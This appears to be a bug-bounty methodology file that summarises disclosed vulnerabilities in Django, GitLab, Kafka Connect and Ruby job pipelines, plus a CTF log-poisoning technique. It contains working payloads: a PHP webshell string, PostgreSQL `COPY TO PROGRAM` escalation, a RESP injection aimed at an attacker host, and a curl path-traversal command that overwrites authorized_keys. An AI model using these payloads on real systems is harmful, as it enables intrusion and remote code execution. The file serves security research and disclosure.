## [Bugbountyskills.md] V-35: Deserialization gadget chosen by the payload + `respond_to?` dispatch → argv injection

**Also known as:** `Oj.load` `^o` gadget; duck-typed dispatcher; `Open3.capture3("find", *args)`.
**Mechanism:** a background job pipeline deserializes a user-reachable payload (`Oj.load(job.payload)`), where
the payload's type key (`{"^o":"Node"}`) SELECTS THE CLASS and its instance variables (`args`) are attacker data;
the worker then hands the object to a dispatcher that calls any method the object `respond_to?`s
(`if @data.respond_to?(:run_find) then @data.run_find`) — the payload chooses the gadget, the dispatcher calls it.
The gadget's `Open3.capture3("find", *@args)` needs no shell: ARGUMENT injection (`-exec cat {} ;`) is total.
**Preconditions:** a queue/job abstraction fed by a user-reachable enqueue path; a deserializer without
`safe_load`/`mode: :strict`; a class in the codebase that shells out.
**Detect:** inject the serializer's class tag (`^o`, `!ruby/object:`, `__type`, `$type`) for an existing class;
grep the worker for `respond_to?`/`send`/`method_missing` on deserialized data; list each gadget's CLI and test
argv injection (`-exec`, `--files-from`, `--output=`, `;`), not shell metacharacters.
**Proof of concept:** read a marker file (`cat /tmp/<marker>`) through the gadget's own CLI; keep it read-only.
**Fix shape (state it):** `Oj.safe_load`/strict mode, a class allow-list, and never splat user-derived arrays
into a CLI.
**Do not report:** a deserialization error, or a serialized blob whose class tag is rejected — the finding is
the executed command.

### [bugbountyhuntingskills.md] 7.5 Django ORM `FilteredRelation` alias injection → RCE — CVE-2025-57833

**Source:** HackerOne #3292573 — Django, *“SQL Injection when using FilteredRelation”*, disclosed 2025-09,
assigned CVE-2025-57833; fixed in Django 5.2.6 / 5.1.12 / 4.2.24.

**Core method**
- Django's `FilteredRelation` accepts a user-supplied **alias name** passed via `annotate(**{user_data: ...})`.
  The alias is interpolated into the SQL column list and then re-referenced by `select_related(user_data)`.
- The sanitiser that validates the alias was incomplete: it checked one code path but the alias reached the
  SQL text through `select_related` unfiltered. The tell is the generated query shows
  `author_join2"."id"` — the attacker-controlled string is embedded **inside** a quoted identifier, so the
  injection must use the `"` delimiter to close it.
- The same primitive works across **all database backends** (SQLite demo, but PostgreSQL escalation was
  demonstrated): on PostgreSQL, the injected SQL can be a stacked `COPY ... TO PROGRAM 'bash -c ...'`
  → RCE as the database service user.
- The PoC requires only `annotate()` + `select_related()` access — any code path that lets a user shape an
  annotation alias is in scope, including admin config forms that accept a label/alias from the UI.

**Lesson.** ORM annotation/aliasing APIs are SQL injection surfaces when the alias is user-controlled.
The backend treats the alias as an identifier, so `"` is the breakout delimiter, not `'`. After confirming
the alias reaches SQL, test the backend-specific escalation vector: `COPY ... TO PROGRAM` (PostgreSQL),
`SELECT INTO OUTFILE` / `LOAD_FILE` (MySQL), `pg_read_file` / `xp_cmdshell` (MSSQL).

**Transferable test.** For every ORM that lets a user name an annotation/`FilteredRelation`/`with` clause,
send `aliasName"` as the name and watch for a SQL syntax error that reveals the quoting delimiter. Then
test stacked queries and the RCE primitive for the detected backend.

### [bugbountyhuntingskills.md] 8.6 LFI → RCE via log poisoning

**Source:** TryHackMe *Include* (2025-02); Medium *"Include CTF"*.

**Core method**
- With arbitrary file read but no upload, poison a file the web server will later `include`:
  - **Apache access log**: request a URL containing `<?php system($_GET['c']); ?>` (URL-encode the
    spaces/quotes), then include `/var/log/apache2/access.log`.
  - **SSH auth log**: use the username field (`ssh '<?php ...?>'@target`).
  - **Mail log**: inject into the subject/body via SMTP, include `/var/log/mail.log`.
  - **PHP session file**: set a session value to the payload, include
    `/var/lib/php/sessions/sess_<PHPSESSID>`.
- Bypass the "no upload" and "no RCE" assumption: you do not need to write a new file, only a file
  that already exists and is world-writable by a service you can reach.

**Transferable test.** `ffuf` with the SecLists LFI list (`LFI-Jhaddix.txt`) against the parameter,
then for every 200 with a distinct size, try the log/session/proc paths. Compare `Content-Length`
and first-line bytes, not just status code.

### [bugbountyhuntingskills.md] 13.6 Driver-mediated RCE: upload + SSRF to a local JMX agent

**Source:** HackerOne #1547877 — Aiven Kafka Connect, **$5,000**, by @jarij.

**Core method**
1. The JDBC sink connector bundles the **SQLite JDBC driver**, which can create/upload a database
   file onto the worker's filesystem.
2. The HTTP sink connector can issue requests to `localhost` — an SSRF primitive.
3. Unprotected **Jolokia** listens on `localhost:6725`; the
   `com.sun.management:type=DiagnosticCommand` MBean exposes `jvmtiAgentLoad`.
4. Build a SQLite DB whose BLOB column contains a **JVMTI agent JAR** (a valid agent with
   `Agent_OnAttach`), upload it through the JDBC connector, then call `jvmtiAgentLoad` over the SSRF
   to load the DB-as-agent → arbitrary code in the Kafka Connect JVM.
5. Reverse shell to the listener.

**Lesson.** "Configuration-only" connectors are code execution surfaces: JDBC drivers, script
transforms, HTTP sinks, and JMX endpoints compose. When you find SSRF to `localhost`, enumerate
management planes (Jolokia 6725/8778, Actuator, Prometheus, Redis, Docker 2375, kubelet 10250)
before declaring it "only SSRF".

### [bugbountyhuntingskills.md] 17.10 Ruby Octokit/Sawyer method override → redis RESP size-desync → injected Redis command → Marshal.load session deserialization → RCE (GitLab GitHub import)

SOURCE: HackerOne #1679624 — GitLab (vakzz), "Remote Command Execution via Github import" (CVE-2022-2992, CVSS 9.9 Critical, $33,510, disclosed 2022-10-06)  read 2026-11-07
NOTE: the primary report page (hackerone.com/reports/1679624) did NOT render on direct fetch — web_extract returned the JS shell and the browser hit HackerOne's "Sorry, something went wrong" page (not logged in). Method reconstructed from the report's indexed summary + vakzz's HackerOne profile + GitLab work item #371884 + the Metasploit module gitlab_github_import_rce_cve_2022_2992; no content invented.
CLASS: RCE via protocol/parameter type confusion → RESP (Redis) command injection → insecure deserialization (CWE-843 → CWE-77 → CWE-502)
CORE METHOD:
  1. Entry point: authenticated GitHub-import API. `POST /api/v4/import/github` with `{"personal_access_token":"x","repo_id":"12345","target_namespace":"root","new_name":"gh-import","github_hostname":"https://attacker.tld"}`. GitLab then drives `github_hostname` (the attacker server) using the Octokit/Sawyer GitHub client, fetching repo metadata from it.
  2. Type-confusion primitive: in Ruby the client wraps JSON responses in `Sawyer::Resource`, whose `method_missing` lets ANY JSON key override a method — including `to_s` and `bytesize`. Return `default_branch` as an OBJECT, not the documented string:
     `{"default_branch":{"to_s":{"to_s":"ggg\r\n<RESP>","bytesize":3}}}`
  3. RESP size-desync: GitLab passes that value through `change_head → branch_exists? / branch_names_include?` down into the redis gem, which builds the RESP frame from `to_s` and `bytesize`. Because the declared `bytesize` (3) is SHORTER than the real string, the trailing bytes spill into the socket stream as RAW extra RESP commands (see redis protocol spec). CVE-2022-2884 patched one redis sink in `Gitlab::Cache::Import::Caching`; this is a SECOND sink reachable via `default_branch`.
  4. Inject Redis: emit `*3\r\n$3\r\nset\r\n$<len>\r\nsession:gitlab:<id>\r\n$<len>\r\n<ruby-marshalled payload>` — i.e. `SET session:gitlab:<id>` = a Ruby `Marshal` serialized gadget (devcraft.io universal Ruby deserialization gadget, using `Net::WriteAdapter`/`Gem::Requirement` to reach `Kernel#system`).
  5. Trigger deserialization: `GET /<group>` with `Cookie: _gitlab_session=<id>` → Rails loads the session blob via `Marshal.load` → the gadget fires → command execution as the `git` OS user (a shell is returned).
DETECTION SIGNAL: an authenticated "import from remote" / webhook / unfurl / metadata-pull feature where the server consumes attacker-served JSON through a Ruby Octokit/Sawyer (or any `method_missing` proxy) client; any place a JSON value flows into a LENGTH-PREFIXED protocol builder (redis RESP, memcached, gopher) or into `Marshal.load`/`YAML.load`; the API accepts an object/array where a string is documented; an exceptions log line like `comparison of String with 0 failed` after the import.
CHAIN: authenticated import → attacker API returns nested `default_branch` object → Sawyer overrides `to_s`/`bytesize` → RESP size-desync injects an extra Redis `SET` → `session:gitlab:<id>` key holds a `Marshal` gadget → `_gitlab_session` cookie triggers `Marshal.load` → RCE as the `git` user → server/CI compromise.
TRANSFERABLE TEST: For any feature where the server fetches and parses attacker-controlled JSON (repo/URL import, webhook, preview/unfurl, remote config), return a value as an OBJECT with keys `to_s`+`bytesize` (also try `hash`, `length`, `to_str`) instead of a scalar and watch for a protocol-desync error (`comparison of String with 0 failed` = the tell). In parallel grep the target for flows where fetched data reaches `Marshal.load`/`YAML.load`; if a frame-injectable cache holds a session blob, store a gadget under the session key and trigger a reload.

SOURCE: https://hackerone.com/reports/733072  2026-11-07
ROUTE: full report body via the HackerOne `.json` endpoint (`vulnerability_information`, 2,731 bytes; contains the exact curl). GitLab 12.4.2-EE, "Path traversal, to RCE", High, reporter saltyyolk, disclosed 2022-06-07.
CLASS: path traversal inside a URL path (percent-encoded `%2f` / `%2e%2e` in the package-registry upload route) → arbitrary file write as the `git` service user → `authorized_keys` → RCE (CWE-22 → CWE-94)
CORE METHOD:
  1. Package registry enabled (on by default) + any project + a `Private-Token`. No admin, no special role.
  2. One PUT does it — note `--path-as-is` so curl does not normalise, and the traversal is built from ENCODED segments: `curl -H "Private-Token: $(cat token)" "http://host/api/v4/projects/2/packages/maven/a%2fb%2fc%2f…%2fi%2f1/%2e%2e%2f%2e%2e%2f…(×10)…%2e%2e%2f.ssh%2fauthorized_keys" -XPUT --path-as-is --data-binary @~/.ssh/id_rsa.pub`.
  3. The `%2f` characters stop the router splitting the package path into segments before the decode; the decoded `%2e%2e%2f` chain then walks out of the package storage directory to any path writable by the `git` user.
  4. Overwriting `/var/opt/gitlab/.ssh/authorized_keys` with your public key yields `ssh git@host` → shell as `git` → RCE on the host.
  5. Distinguish from the sibling GitLab `authorized_keys` bugs already in this ledger: §17.30 (#658013 `ref=--output=`, #587854 directory-name-as-flag) is ARGUMENT injection into git's argv; this one is TRAVERSAL through the router/decoder — no dash, no flag, no shell.
DETECTION SIGNAL: PUT/POST artifact routes whose last path element is a user-supplied package/file/artifact name (`/packages/{type}/…`, `/uploads/…`, `/artifacts/…`, `/files/{id}`) — send `%2e%2e%2f` there and see whether a file appears outside the intended directory; path parameters accepted as ONE encoded segment (`a%2fb%2fc`) — if `%2f` survives the router split, `%2e%2e%2f` survives with it; any storage directory sharing a parent with a service account's home (`/var/opt/<app>/.ssh`, `.gitconfig`, cron, `.pth`); the write is invisible until you fetch the file back or SSH in — always verify out of band.

TRANSFERABLE TEST: Take the artifact/upload route, URL-encode the whole "filename" as one segment and prefix it with N repeats of `%2e%2e%2f`, targeting `%2e%2e%2f.ssh%2fauthorized_keys`; send with `curl --path-as-is`. Confirm the write independently (SSH, or fetch the same path through the app's read route, or trigger the file). Repeat with the encoded-vs-double-encoded ladder (`..%2f`, `%252e%252e%252f`) — the rung that works tells you how many decode passes the stack performs.
